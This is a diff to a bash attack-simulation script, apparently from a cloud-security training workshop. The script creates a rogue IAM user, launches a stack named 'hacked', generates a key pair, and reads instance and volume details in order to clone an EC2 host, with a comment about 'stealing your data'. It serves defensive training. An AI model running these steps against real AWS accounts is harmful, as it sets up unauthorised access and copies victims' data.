@@ -1,12 +1,12 @@
 #!/usr/bin/env bash
 
 aws iam create-user --user-name Ip0wneDU
-aws cloudformation create-stack --stack-name hacked --template-body https://s3.us-east-2.amazonaws.com/710582532708securityjam20/KickOff.sh.template --region us-east-2 --capabilities="CAPABILITY_NAMED_IAM"
+aws cloudformation create-stack  --stack-name hacked --template-body file:///opt/datadog-training/learning-center-assets/workshops/securing-cloud-native-infrastructure/attack-simulation/launch.yaml --region us-east-2 --capabilities="CAPABILITY_NAMED_IAM"
 
     until [ "$status" = "CREATE_COMPLETE" ]; do
-        status=$(aws cloudformation describe-stacks --stack-name "hacked"  --output text  --region us-east-2 | cut -f6 -d$'\t')
+        status=$(aws cloudformation describe-stacks --stack-name "hacked"  --output text  --region us-east-2 | cut -f7 -d$'\t')
         echo "Stack: $snapshot Status: $status"
-        sleep 5
+       sleep 5
     done
 
 keyPair=$(aws ec2 create-key-pair --key-name 0wned  --region us-east-2 --output text)
@@ -18,7 +18,7 @@ AWS_SECRET_KEY=$(echo $keyPair | cut -d " " -f4)
 #export AWS_SECRET_ACCESS_KEY=$AWS_SECRET_KEY
 
 #aws ec2 create-image --instance-id i-0f3d52166ee6dc9b8 --name "My server" --description "HaHa Stealing your data" --no-reboot > imageId
-id=$(aws ec2 describe-instances --filters "Name=tag:Name,Values=Application Host" --output  text  --region us-east-2 | awk -F"\t" '$1=="INSTANCES" {print $8}')
+id=$(aws ec2 describe-instances --filters  --output text  --region us-east-2 | awk -F"\t" '$1=="INSTANCES" {print $9}')
 
 #Set $id to the ID of the EC2 instance you want to clone
 #id=i-########
@@ -38,7 +38,7 @@ vol_list=$(echo "$instance_description" | grep EBS | cut -f5 -d$'\t')
 vols=($vol_list)
 
 #Reading the instance type
-instance_type=$(echo "$instance_description" | grep INSTANCE | cut -f9 -d$'\t')
+instance_type=$(echo "$instance_description" | grep INSTANCE | cut -f10 -d$'\t')
 
 #Reading the AWS region; the second grep command uses regex to remove the last digit because otherwise ec2-run-instance will fail
 region=$(echo "$instance_description" | grep INSTANCE | cut -f11 -d$'\t' | grep -o -E '.*-.*-\d')
